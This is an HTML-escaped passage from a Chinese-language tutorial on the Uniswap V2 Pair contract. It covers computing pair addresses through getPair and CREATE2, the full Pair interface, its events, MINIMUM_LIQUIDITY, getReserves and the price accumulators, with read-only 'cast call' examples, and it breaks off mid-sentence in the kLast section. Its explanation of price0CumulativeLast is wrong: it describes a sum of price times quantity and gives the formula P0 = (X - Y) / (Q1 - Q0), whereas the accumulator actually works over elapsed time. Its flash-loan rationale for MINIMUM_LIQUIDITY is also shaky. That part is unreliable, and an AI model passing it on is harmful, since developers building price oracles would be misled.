2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;方式1&#34;&gt;&lt;span&gt;方式1:&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%96%b9%e5%bc%8f1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;使用Factory的&lt;code&gt;getPair&lt;/code&gt;函数&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# 比如查询 DAI-USDC交易对对应的Pair&#xA;# DAI: 0x6B175474E89094C44Da98b954EedeAC495271d0F&#xA;# USDC: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&#xA;# 返回: 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5&#xA;cast call 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f &amp;#34;getPair(address,address)(address)&amp;#34; 0x6B175474E89094C44Da98b954EedeAC495271d0F  0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;方式2&#34;&gt;&lt;span&gt;方式2&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%96%b9%e5%bc%8f2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;Pair是通过&lt;a href=&#34;https://www.evm.codes/?fork=merge&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Create2&lt;/a&gt; 创建的, 所以其地址是可以计算出来的, 参考这里 &lt;a href=&#34;https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/getting-pair-addresses&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/getting-pair-addresses&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;举例:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function testPairAddress() public view {&#xA;        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;&#xA;        address token0 = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI&#xA;        address token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC&#xA;&#xA;&#x9;&#x9;&#x9;&#x9;//方式1&#xA;        address pairAddress1 = IUniswapV2Factory(factory).getPair(&#xA;            token0,&#xA;            token1&#xA;        );&#xA;&#x9;&#x9;&#x9;&#x9;//方式2 (下面的代码对于任何pair都一样, 不用变)&#xA;        address pairAddress2 = address(&#xA;            uint160(&#xA;                (&#xA;                    uint(&#xA;                        keccak256(&#xA;                            abi.encodePacked(&#xA;                                hex&amp;#34;ff&amp;#34;,&#xA;                                factory,&#xA;                                keccak256(abi.encodePacked(token0, token1)),&#xA;                                hex&amp;#34;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&amp;#34;&#xA;                            )&#xA;                        )&#xA;                    )&#xA;                )&#xA;            )&#xA;        );&#xA;&#xA;        console2.log(&amp;#34;pair address 1:&amp;#34;, pairAddress1);&#xA;        console2.log(&amp;#34;pair address 2:&amp;#34;, pairAddress2);&#xA;&#xA;        assert(pairAddress1 == pairAddress2);&#xA;    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中 &lt;code&gt;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&lt;/code&gt; 是uniswap创建pair时传递给creat2的 keccak256(init_code)&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;接口-1&#34;&gt;&lt;span&gt;接口&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%8e%a5%e5%8f%a3-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;import &amp;#39;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;import IUniswapV2Pair from &amp;#39;@uniswap/v2-core/build/IUniswapV2Pair.json&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;pragma solidity &amp;gt;=0.5.0;&#xA;&#xA;interface IUniswapV2Pair {&#xA;  event Approval(address indexed owner, address indexed spender, uint value);&#xA;  event Transfer(address indexed from, address indexed to, uint value);&#xA;&#xA;  function name() external pure returns (string memory);&#xA;  function symbol() external pure returns (string memory);&#xA;  function decimals() external pure returns (uint8);&#xA;  function totalSupply() external view returns (uint);&#xA;  function balanceOf(address owner) external view returns (uint);&#xA;  function allowance(address owner, address spender) external view returns (uint);&#xA;&#xA;  function approve(address spender, uint value) external returns (bool);&#xA;  function transfer(address to, uint value) external returns (bool);&#xA;  function transferFrom(address from, address to, uint value) external returns (bool);&#xA;&#xA;  function DOMAIN_SEPARATOR() external view returns (bytes32);&#xA;  function PERMIT_TYPEHASH() external pure returns (bytes32);&#xA;  function nonces(address owner) external view returns (uint);&#xA;&#xA;  function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;&#xA;&#xA;  event Mint(address indexed sender, uint amount0, uint amount1);&#xA;  event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);&#xA;  event Swap(&#xA;      address indexed sender,&#xA;      uint amount0In,&#xA;      uint amount1In,&#xA;      uint amount0Out,&#xA;      uint amount1Out,&#xA;      address indexed to&#xA;  );&#xA;  event Sync(uint112 reserve0, uint112 reserve1);&#xA;&#xA;  function MINIMUM_LIQUIDITY() external pure returns (uint);&#xA;  function factory() external view returns (address);&#xA;  function token0() external view returns (address);&#xA;  function token1() external view returns (address);&#xA;  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);&#xA;  function price0CumulativeLast() external view returns (uint);&#xA;  function price1CumulativeLast() external view returns (uint);&#xA;  function kLast() external view returns (uint);&#xA;&#xA;  function mint(address to) external returns (uint liquidity);&#xA;  function burn(address to) external returns (uint amount0, uint amount1);&#xA;  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;&#xA;  function skim(address to) external;&#xA;  function sync() external;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;event-mint&#34;&gt;&lt;span&gt;event Mint&lt;/span&gt;&#xA;  &lt;a href=&#34;#event-mint&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;当流动性代币被铸造(&lt;code&gt;mint()&lt;/code&gt;)的时候触发&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;event Mint(address indexed sender, uint amount0, uint amount1);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;event-burn&#34;&gt;&lt;span&gt;event Burn&lt;/span&gt;&#xA;  &lt;a href=&#34;#event-burn&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;当流动性代币被销毁(&lt;code&gt;burn()&lt;/code&gt;)的时候触发&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;event-swap&#34;&gt;&lt;span&gt;event Swap&lt;/span&gt;&#xA;  &lt;a href=&#34;#event-swap&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;当 &lt;code&gt;swap()&lt;/code&gt;函数被成功调用后触发&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;event Swap(&#xA;  address indexed sender,&#xA;  uint amount0In,&#xA;  uint amount1In,&#xA;  uint amount0Out,&#xA;  uint amount1Out,&#xA;  address indexed to&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;event-sync&#34;&gt;&lt;span&gt;event Sync&lt;/span&gt;&#xA;  &lt;a href=&#34;#event-sync&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;&lt;code&gt;mint&lt;/code&gt; &lt;code&gt;burn&lt;/code&gt; &lt;code&gt;swap&lt;/code&gt; &lt;code&gt;sync&lt;/code&gt; 时都会触发&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;minimum_liquidity&#34;&gt;&lt;span&gt;MINIMUM_LIQUIDITY&lt;/span&gt;&#xA;  &lt;a href=&#34;#minimum_liquidity&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;返回 流动性代币最小值 (固定值1000)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function MINIMUM_LIQUIDITY() external pure returns (uint);&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;# 1000&#xA;cast call 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5 &amp;#34;MINIMUM_LIQUIDITY()(uint)&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;每对交易对（pair）都会在合约创建时初始化一个名为MINIMUM_LIQUIDITY的变量。该变量是一个固定值(1000)，用于确保交易对的初始流动性总量大于零。这意味着在交易对中添加流动性之前，必须先添加至少1000个流动性代币（Liquidity Token）才能完成初始化.MINIMUM_LIQUIDITY的存在是为了防止某些攻击，例如闪电贷攻击，其可能会通过在交易对中添加和删除大量流动性代币来操纵价格和市场深度。由于MINIMUM_LIQUIDITY的存在，这种攻击在Uniswap中不再有效。&lt;/p&gt;&#xA;&lt;p&gt;需要注意的是，一旦交易对的流动性代币数量超过了MINIMUM_LIQUIDITY，该变量的值对交易对的操作不再有影响，而仅仅是一个初始化时的限制。&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;factory&#34;&gt;&lt;span&gt;factory&lt;/span&gt;&#xA;  &lt;a href=&#34;#factory&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;返回生成该Pair的Factory的地址&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function factory() external view returns (address);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;token0-token1&#34;&gt;&lt;span&gt;token0 token1&lt;/span&gt;&#xA;  &lt;a href=&#34;#token0-token1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;返回对应的两个token的地址&lt;/p&gt;&#xA;&lt;p&gt;谁是token0&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function token0() external view returns (address);&#xA;function token1() external view returns (address);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;getreserves&#34;&gt;&lt;span&gt;getReserves&lt;/span&gt;&#xA;  &lt;a href=&#34;#getreserves&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;p&gt;返回 token0, token1的储备量. 这个储备量会用于&lt;a href=&#34;https://docs.uniswap.org/contracts/v2/concepts/advanced-topics/pricing&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;定价&lt;/a&gt;和分配流动性, 还返回最后一次与Pair交互的时间&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;举例:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;cast call 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5 &amp;#34;getReserves()(uint112,uint112,uint32)&amp;#34;&#xA;# 17855224108246409584874388&#xA;# 17830344327957&#xA;# 1678333223&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;price0cumulativelast-----price1cumulativelast&#34;&gt;&lt;span&gt;price0CumulativeLast     price1CumulativeLast&lt;/span&gt;&#xA;  &lt;a href=&#34;#price0cumulativelast-----price1cumulativelast&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;function price0CumulativeLast() external view returns (uint);&#xA;function price1CumulativeLast() external view returns (uint);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;价格累积函数（Price Cumulative Function）是Uniswap用来计算某个交易对价格的一种方式。每当交易对的价格发生变化时，价格累积函数的值就会更新。&lt;/p&gt;&#xA;&lt;p&gt;在Uniswap中，每个Pair都有两个价格累积函数，分别称为&lt;code&gt;price0CumulativeLast&lt;/code&gt;和&lt;code&gt;price1CumulativeLast&lt;/code&gt;。其中，&lt;code&gt;price0CumulativeLast&lt;/code&gt;表示当前Pair的第一个代币（Token0）的价格累积函数的值，而&lt;code&gt;price1CumulativeLast&lt;/code&gt;表示当前Pair的第二个代币（Token1）的价格累积函数的值。&lt;/p&gt;&#xA;&lt;p&gt;具体来说，&lt;code&gt;price0CumulativeLast&lt;/code&gt;函数表示从创建Pair以来，Token1在交易中累计出售量与Token0价格乘积的累加值。也就是说，如果当前Pair的价格为P，Token1的数量为Q，则&lt;code&gt;price0CumulativeLast&lt;/code&gt;的值为P*Q的累加和。&lt;/p&gt;&#xA;&lt;p&gt;在Uniswap中，根据价格累积函数的值可以计算出当前价格，从而实现交易对的价格发现。例如，对于一个Pair，假设当前的&lt;code&gt;price0CumulativeLast&lt;/code&gt;值为X，上一次交易时的&lt;code&gt;price0CumulativeLast&lt;/code&gt;值为Y，上一次交易时的时间为T，则当前价格P0（即Token0相对于Token1的价格）可以通过以下公式计算得出：&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;P0 = (X - Y) / (Q1 - Q0)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;其中，Q1和Q0分别表示两次交易时的Token1数量。&lt;/p&gt;&#xA;&lt;p&gt;因此，&lt;code&gt;price0CumulativeLast&lt;/code&gt;函数在Uniswap中扮演着重要的角色，用于计算交易对的价格以及实现交易对的自动价格发现功能。&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;klast&#34;&gt;&lt;span&gt;kLast&lt;/span&gt;&#xA;  &lt;a href=&#34;#klast&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;function kLast() external view returns (uint);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;每个交易对（Pair）都有一个参数叫做&amp;quot;k&amp;quot;值，它表示该交易对的流动性大小。&amp;ldquo;k&amp;quot;值是由该交易对中两种资产的余额相乘得出的。例如，对于一个交易对，其中ETH余额为100，ERC20代币余额为200，则该交易对的&amp;quot;k&amp;quot;值为20,000（100 * 200 = 